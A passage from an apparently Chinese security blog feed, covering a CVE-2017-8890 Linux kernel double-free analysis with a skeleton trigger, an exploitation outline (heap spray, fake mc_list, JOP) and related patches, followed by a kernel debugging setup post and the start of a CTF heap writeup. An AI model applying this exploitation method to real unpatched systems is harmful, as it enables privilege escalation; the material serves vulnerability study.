class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><strong>在accecpt的时候，创建一个新的socket的，parent的所有field(除了ref_cnt)被拷贝给新生成的socket对象，包括mc_list指针的值，于是就有了多个指针指向同一块内存，从而在后面造成double free。</strong></p><h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sockfd = socket(AF_INET, xx, IPPROTO_TCP);</span><br><span class="line">setsockopt(sockfd, SOL_IP, MCAST_JOIN_GROUP, xxxx, xxxx);</span><br><span class="line">bind(sockfd, xxxx, xxxx);</span><br><span class="line">listen(sockfd, xxxx);</span><br><span class="line">newsockfd = accept(sockfd, xxxx, xxxx);</span><br><span class="line">close(newsockfd);// first free (kfree_rcu)</span><br><span class="line">sleep(5);// wait rcu free(real first free)</span><br><span class="line">close(sockfd);// double free</span><br></pre></td></tr></table></figure><ul><li><p>int socket(int af, int type, int protocol);<br>1) af 为地址族（Address Family），也就是 IP 地址类型，常用的有 AF_INET 和 AF_INET6。AF 是“Address Family”的简写，INET是“Inetnet”的简写。AF_INET 表示 IPv4 地址，例如 127.0.0.1；AF_INET6 表示 IPv6 地址，例如 1030::C9B4:FF12:48AA:1A2B。<br>你也可以使用PF前缀，PF是“Protocol Family”的简写，它和AF是一样的。例如，PF_INET 等价于 AF_INET，PF_INET6 等价于 AF_INET6。<br>2) type 为数据传输方式，常用的有 SOCK_STREAM 和 SOCK_DGRAM,<br>3) protocol 表示传输协议，常用的有 IPPROTO_TCP 和 IPPTOTO_UDP，分别表示 TCP 传输协议和 UDP 传输协议。</p></li><li><p>int setsockopt(int sock, int level, int optname, void <em>optval, socklen_t </em>optlen);<br>参数：<br>sock：将要被设置或者获取选项的套接字。<br>level：选项所在的协议层。<br>optname：需要访问的选项名。<br>optval：对于getsockopt()，指向返回选项值的缓冲。 对于setsockopt()，指向包含新选项值的缓冲。<br>optlen：对于getsockopt()，作为入口参数时，选项值的最大长度。 作为出口参数时，选项值的实际长度。 对于setsockopt()，现选项的长度。</p></li><li>int bind(int sock, struct sockaddr *addr, socklen_t addrlen);  //Linux<br>sock 为 socket 文件描述符，addr 为 sockaddr 结构体变量的指针，addrlen 为 addr 变量的大小，可由 sizeof() 计算得出。<br><a href="http://c.biancheng.net/cpp/html/3033.html" target="_blank" rel="noopener">http://c.biancheng.net/cpp/html/3033.html</a></li><li>int listen(int sock, int backlog);  //Linux<br>sock 为需要进入监听状态的套接字，backlog 为请求队列的最大长度。<br>所谓被动监听，是指当没有客户端请求时，套接字处于“睡眠”状态，只有当接收到客户端请求时，套接字才会被“唤醒”来响应请求。<br>注意：listen() 只是让套接字处于监听状态，并没有接收请求。接收请求需要使用 accept() 函数。</li><li>int accept(int sock, struct sockaddr <em>addr, socklen_t </em>addrlen);  //Linux<br>它的参数与 listen() 和 connect() 是相同的：sock 为服务器端套接字，addr 为 sockaddr_in 结构体变量，addrlen 为参数 addr 的长度，可由 sizeof() 求得。<br><strong>accept() 返回一个新的套接字来和客户端通信，addr 保存了客户端的IP地址和端口号，而 sock 是服务器端的套接字，大家注意区分。后面和客户端通信时，要使用这个新生成的套接字，而不是原来服务器端的套接字。</strong><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+ mc_list 在内核中以链表形式存在，通过第一个成员next_rcu指向下一个mc_list</span><br><span class="line"></span><br><span class="line">+ 当要释放一个mc_list的时候，rcu_head会被链到一个释放链表中</span><br><span class="line"></span><br><span class="line">+ 我们可以在用户态伪造一个fake_mc_list，让被堆喷的对象的next_rcu指向用户态的fake_mc_list</span><br><span class="line"></span><br><span class="line">那么最终的利用思路如下：</span><br><span class="line"></span><br><span class="line">+ 用户态创建结构 fake_mc_list</span><br><span class="line"></span><br><span class="line">+ mmap(fake_mc_list)</span><br><span class="line"></span><br><span class="line">+ 创建漏洞结构体</span><br><span class="line"></span><br><span class="line">+ 第一次释放</span><br><span class="line"></span><br><span class="line">+ 堆喷占位，覆盖被释放对象的next_rcu</span><br><span class="line"></span><br><span class="line">+ 第二次释放，使 fake_mc_list 上链</span><br><span class="line"></span><br><span class="line">+ fake_mc_list.rcu-&gt;func 为 JOP 地址</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-034709.jpg" alt=""></p><h2 id="漏洞模型"><a href="#漏洞模型" class="headerlink" title="漏洞模型"></a>漏洞模型</h2><h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>事实上类似的模式早就被commit过patch<br><a href="https://github.com/torvalds/linux/commit/8b485ce69876c65db12ed390e7f9c0d2a64eff2c" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/8b485ce69876c65db12ed390e7f9c0d2a64eff2c</a><br>所以多看commit很重要，可以学习挖洞的模式。<br>可以看一下说明，提到了double free，触发地点也很接近。</p><p><strong>tcp: do not inherit fastopen_req from parent</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcp: do not inherit fastopen_req from parent</span><br><span class="line"></span><br><span class="line">Under fuzzer stress, it is possible that a child gets a non NULL</span><br><span class="line">fastopen_req pointer from its parent at accept() time, when/if parent</span><br><span class="line">morphs from listener to active session.</span><br><span class="line"></span><br><span class="line">We need to make sure this can not happen, by clearing the field after</span><br><span class="line">socket cloning.</span><br><span class="line"></span><br><span class="line">BUG: Double free or freeing an invalid pointer</span><br></pre></td></tr></table></figure></p><p><strong>patch</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">newicsk-&gt;icsk_ack.last_seg_size = skb-&gt;len - newtp-&gt;tcp_header_len;</span><br><span class="line"> newtp-&gt;rx_opt.mss_clamp = req-&gt;mss;</span><br><span class="line"> tcp_ecn_openreq_child(newtp, req);</span><br><span class="line">+newtp-&gt;fastopen_req = NULL;</span><br><span class="line"> newtp-&gt;fastopen_rsk = NULL;</span><br><span class="line"> newtp-&gt;syn_data_acked = 0;</span><br><span class="line"> newtp-&gt;rack.mstamp.v64 = 0;</span><br></pre></td></tr></table></figure></p><h3 id="CVE-2017-9075"><a href="#CVE-2017-9075" class="headerlink" title="CVE-2017-9075"></a>CVE-2017-9075</h3><h4 id="do-not-inherit-ipv6-mc-ac-fl-list-from-parent"><a href="#do-not-inherit-ipv6-mc-ac-fl-list-from-parent" class="headerlink" title="do not inherit ipv6_{mc|ac|fl}_list from parent"></a>do not inherit ipv6_{mc|ac|fl}_list from parent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sctp: do not inherit ipv6_&#123;mc|ac|fl&#125;_list from parent</span><br><span class="line">SCTP needs fixes similar to 83eaddab4378 (&quot;ipv6/dccp: do not inherit</span><br><span class="line">ipv6_mc_list from parent&quot;), otherwise bad things can happen.</span><br></pre></td></tr></table></figure><h4 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+++ b/net/sctp/ipv6.c</span><br><span class="line">@@ -677,6 +677,9 @@ static struct sock *sctp_v6_create_accept_sk(struct sock *sk,</span><br><span class="line"> newnp = inet6_sk(newsk);</span><br><span class="line"> </span><br><span class="line"> memcpy(newnp, np, sizeof(struct ipv6_pinfo));</span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> </span><br><span class="line"> rcu_read_lock();</span><br><span class="line"> opt = rcu_dereference(np-&gt;opt);</span><br></pre></td></tr></table></figure><h3 id="CVE-2017-9076-CVE-2017-9077"><a href="#CVE-2017-9076-CVE-2017-9077" class="headerlink" title="CVE-2017-9076/CVE-2017-9077"></a>CVE-2017-9076/CVE-2017-9077</h3><h4 id="ipv6-dccp-do-not-inherit-ipv6-mc-list-from-parent"><a href="#ipv6-dccp-do-not-inherit-ipv6-mc-list-from-parent" class="headerlink" title="ipv6/dccp: do not inherit ipv6_mc_list from parent"></a>ipv6/dccp: do not inherit ipv6_mc_list from parent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Like commit 657831ffc38e (&quot;dccp/tcp: do not inherit mc_list from parent&quot;)</span><br><span class="line">we should clear ipv6_mc_list etc. for IPv6 sockets too.</span><br></pre></td></tr></table></figure><h4 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/net/dccp/ipv6.c b/net/dccp/ipv6.c</span><br><span class="line">index d9b6a4e..b6bbb71 100644</span><br><span class="line">--- a/net/dccp/ipv6.c</span><br><span class="line">+++ b/net/dccp/ipv6.c</span><br><span class="line">@@ -426,6 +426,9 @@ static struct sock *dccp_v6_request_recv_sock(const struct sock *sk,</span><br><span class="line"> newsk-&gt;sk_backlog_rcv = dccp_v4_do_rcv;</span><br><span class="line"> newnp-&gt;pktoptions  = NULL;</span><br><span class="line"> newnp-&gt;opt   = NULL;</span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> newnp-&gt;mcast_oif   = inet6_iif(skb);</span><br><span class="line"> newnp-&gt;mcast_hops  = ipv6_hdr(skb)-&gt;hop_limit;</span><br><span class="line"> </span><br><span class="line">@@ -490,6 +493,9 @@ static struct sock *dccp_v6_request_recv_sock(const struct sock *sk,</span><br><span class="line"> /* Clone RX bits */</span><br><span class="line"> newnp-&gt;rxopt.all = np-&gt;rxopt.all;</span><br><span class="line"> </span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line">+newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> newnp-&gt;pktoptions = NULL;</span><br><span class="line"> newnp-&gt;opt  = NULL;</span><br><span class="line"> newnp-&gt;mcast_oif  = inet6_iif(skb);</span><br><span class="line">diff --git a/net/ipv6/tcp_ipv6.c b/net/ipv6/tcp_ipv6.c</span><br><span class="line">index aeb9497..df5a9ff 100644</span><br><span class="line">--- a/net/ipv6/tcp_ipv6.c</span><br><span class="line">+++ b/net/ipv6/tcp_ipv6.c</span><br><span class="line">@@ -1062,6 +1062,7 @@ static struct sock *tcp_v6_syn_recv_sock(const struct sock *sk, struct sk_buff *</span><br><span class="line"> newtp-&gt;af_specific = &amp;tcp_sock_ipv6_mapped_specific;</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_fl_list = NULL;</span><br><span class="line"> newnp-&gt;pktoptions  = NULL;</span><br><span class="line">@@ -1131,6 +1132,7 @@ static struct sock *tcp_v6_syn_recv_sock(const struct sock *sk, struct sk_buff *</span><br><span class="line">    First: no IPv4 options.</span><br><span class="line">  */</span><br><span class="line"> newinet-&gt;inet_opt = NULL;</span><br><span class="line">+newnp-&gt;ipv6_mc_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_ac_list = NULL;</span><br><span class="line"> newnp-&gt;ipv6_fl_list = NULL;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://2freeman.github.io/2018/01/06/CVE-2017-8890-internals.html" target="_blank" rel="noopener">https://2freeman.github.io/2018/01/06/CVE-2017-8890-internals.html</a><br><a href="https://bbs.pediy.com/thread-226057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226057.htm</a><br><a href="http://www.freebuf.com/articles/terminal/160041.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/160041.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;poc运行&quot;&gt;&lt;a href=&quot;#poc运行&quot; class=&quot;headerlink&quot; title=&quot;poc运行&quot;&gt;&lt;/a&gt;poc运行&lt;/h2&gt;&lt;p&gt;在github找了一个&lt;a href=&quot;https://github.com/beraphin/CVE-2017-8
      
    
    </summary>
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/kernel/"/>
    
    
      <category term="cve" scheme="http://eternalsakura13.com/tags/cve/"/>
    
      <category term="kernel" scheme="http://eternalsakura13.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>qemu+gdb kernel调试环境搭建</title>
    <link href="http://eternalsakura13.com/2018/04/13/qemu/"/>
    <id>http://eternalsakura13.com/2018/04/13/qemu/</id>
    <published>2018-04-12T16:38:38.562Z</published>
    <updated>2018-04-12T16:41:36.010Z</updated>
    
    <content type="html"><![CDATA[<p>这个最后是失败了的，各种原因吧，主要是gdb版本的问题，我又不想重新编译gdb就放弃了这个方法，不过供其他想要搭建qemu+gdb的人参考吧，毕竟我也折腾老半天了。。<br>可能以后哪天成功了回来更新一下。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/hit/once$ uname -a</span><br><span class="line">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">parallels@ubuntu:~/ctf/hit/once$ gcc -v</span><br><span class="line">gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)</span><br></pre></td></tr></table></figure><h2 id="下kernel-source-code，解压"><a href="#下kernel-source-code，解压" class="headerlink" title="下kernel source code，解压"></a>下kernel source code，解压</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.10.1.tar.gz</span><br><span class="line">tar -xzvf linux-4.10.1.tar.gz //解压tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libncurses5-dev</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><ol><li><p>make menuconfig<br>进入kernel hacking<br>勾选以下项目<br>Kernel debugging<br>Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers<br>KGDB<br>然后保存退出</p></li><li><p>make bzImage<br>提示如下信息则编译成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Setup is 17436 bytes (padded to 17920 bytes).</span><br><span class="line">System is 7063 kB</span><br><span class="line">CRC 78823741</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure></li><li><p>从kernel source code根目录取到vmlinux，从arch/x86/boot/取到bzImage</p></li></ol><h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.27.2.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.27.2.tar.bz2</span><br><span class="line">cd busybox-1.27.2</span><br><span class="line">make menuconfig # Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="建立文件系统（busybox"><a href="#建立文件系统（busybox" class="headerlink" title="建立文件系统（busybox)"></a>建立文件系统（busybox)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">vim etc/inittab</span><br><span class="line">添加以下内容</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br><span class="line"></span><br><span class="line">mkdir etc/init.d</span><br><span class="line">vim etc/init.d/rcS </span><br><span class="line">添加以下内容</span><br><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"></span><br><span class="line">chmod +x ./etc/init.d/rcS</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ~/core/rootfs.img</span><br><span class="line">gzip -c rootfs.img &gt; rootfs.img.gz</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个最后是失败了的，各种原因吧，主要是gdb版本的问题，我又不想重新编译gdb就放弃了这个方法，不过供其他想要搭建qemu+gdb的人参考吧，毕竟我也折腾老半天了。。&lt;br&gt;可能以后哪天成功了回来更新一下。&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; cla
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/CTF/pwn/kernel/"/>
    
    
      <category term="kernel" scheme="http://eternalsakura13.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>0ctf2018 heapstorm2 writeup</title>
    <link href="http://eternalsakura13.com/2018/04/03/heapstorm2/"/>
    <id>http://eternalsakura13.com/2018/04/03/heapstorm2/</id>
    <published>2018-04-03T12:31:16.493Z</published>
    <updated>2018-04-12T17:40:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/heapstorm2" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/heapstorm2</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li><p>mallopt<br>int mallopt(int param,int value) param的取值分别为M_MXFAST，value是以字节为单位。<br>M_MXFAST:定义使用fastbins的内存请求大小的上限，小于该阈值的小块内存请求将不会使用fastbins获得内存，其缺省值为64。下面我们来将M_MXFAST设置为0，禁止使用fastbins<br><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.h.html" target="_blank" rel="noopener">源码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">102</span>     <span class="meta">#<span class="meta-keyword">ifndef</span> M_MXFAST</span></span><br><span class="line"><span class="number">103</span><span class="meta"># <span class="meta-keyword">define</span> M_MXFAST  1    <span class="comment">/* maximum request size for "fastbins" */</span></span></span><br><span class="line"><span class="number">104</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="number">5137</span><span class="keyword">int</span> __libc_mallopt (<span class="keyword">int</span> param_number, <span class="keyword">int</span> value)</span><br><span class="line"><span class="number">5138</span>&#123;</span><br><span class="line"><span class="number">5139</span>  mstate av = &amp;main_arena;</span><br><span class="line"><span class="number">5140</span>  <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line"><span class="number">5141</span></span><br><span class="line"><span class="number">5142</span>  <span class="keyword">if</span> (__malloc_initialized &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">5143</span>    ptmalloc_init ();</span><br><span class="line"><span class="number">5144</span>  __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"><span class="number">5145</span></span><br><span class="line"><span class="number">5146</span>  LIBC_PROBE (memory_mallopt, <span class="number">2</span>, param_number, value);</span><br><span class="line"><span class="number">5147</span></span><br><span class="line"><span class="number">5148</span>  <span class="comment">/* We must consolidate main arena before changing max_fast</span></span><br><span class="line"><span class="comment">5149     (see definition of set_max_fast).  */</span></span><br><span class="line"><span class="number">5150</span>  malloc_consolidate (av);</span><br><span class="line"><span class="number">5151</span></span><br><span class="line"><span class="number">5152</span>  <span class="keyword">switch</span> (param_number)</span><br><span class="line"><span class="number">5153</span>    &#123;</span><br><span class="line"><span class="number">5154</span>    <span class="keyword">case</span> M_MXFAST:</span><br><span class="line"><span class="number">5155</span>      <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE)</span><br><span class="line"><span class="number">5156</span>        &#123;</span><br><span class="line"><span class="number">5157</span>          LIBC_PROBE (memory_mallopt_mxfast, <span class="number">2</span>, value, get_max_fast ());</span><br><span class="line"><span class="number">5158</span>          set_max_fast (value);</span><br><span class="line"><span class="number">5159</span>        &#125;</span><br><span class="line"><span class="number">5160</span>      <span class="keyword">else</span></span><br><span class="line"><span class="number">5161</span>        res = <span class="number">0</span>;</span><br><span class="line"><span class="number">5162</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5163</span></span><br><span class="line"><span class="number">5164</span>    <span class="keyword">case</span> M_TRIM_THRESHOLD:</span><br><span class="line"><span class="number">5165</span>      do_set_trim_threshold (value);</span><br><span class="line"><span class="number">5166</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5167</span></span><br><span class="line"><span class="number">5168</span>    <span class="keyword">case</span> M_TOP_PAD:</span><br><span class="line"><span class="number">5169</span>      do_set_top_pad (value);</span><br><span class="line"><span class="number">5170</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5171</span></span><br><span class="line"><span class="number">5172</span>    <span class="keyword">case</span> M_MMAP_THRESHOLD:</span><br><span class="line"><span class="number">5173</span>      res = do_set_mmap_threshold (value);</span><br><span class="line"><span class="number">5174</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5175</span></span><br><span class="line"><span class="number">5176</span>    <span class="keyword">case</span> M_MMAP_MAX:</span><br><span class="line"><span class="number">5177</span>      do_set_mmaps_max (value);</span><br><span class="line"><span class="number">5178</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5179</span></span><br><span class="line"><span class="number">5180</span>    <span class="keyword">case</span> M_CHECK_ACTION:</span><br><span class="line"><span class="number">5181</span>      do_set_mallopt_check (value);</span><br><span class="line"><span class="number">5182</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5183</span></span><br><span class="line"><span class="number">5184</span>    <span class="keyword">case</span> M_PERTURB:</span><br><span class="line"><span class="number">5185</span>      do_set_perturb_byte (value);</span><br><span class="line"><span class="number">5186</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5187</span></span><br><span class="line"><span class="number">5188</span>    <span class="keyword">case</span> M_ARENA_TEST:</span><br><span class="line"><span class="number">5189</span>      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">5190</span>        do_set_arena_test (value);</span><br><span class="line"><span class="number">5191</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5192</span></span><br><span class="line"><span class="number">5193</span>    <span class="keyword">case</span> M_ARENA_MAX:</span><br><span class="line"><span class="number">5194</span>      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">5195</span>        do_set_arena_max (value);</span><br><span class="line"><span class="number">5196</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5197</span>    &#125;</span><br><span class="line"><span class="number">5198</span>  __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line"><span class="number">5199</span>  <span class="keyword">return</span> res;</span><br><span class="line"><span class="number">5200</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用linux的/dev/urandom文件产生较好的随机数<br><a href="https://blog.csdn.net/stpeace/article/details/45829161" target="_blank" rel="noopener">https://blog.csdn.net/stpeace/article/details/45829161</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> randNum = <span class="number">0</span>;  </span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);  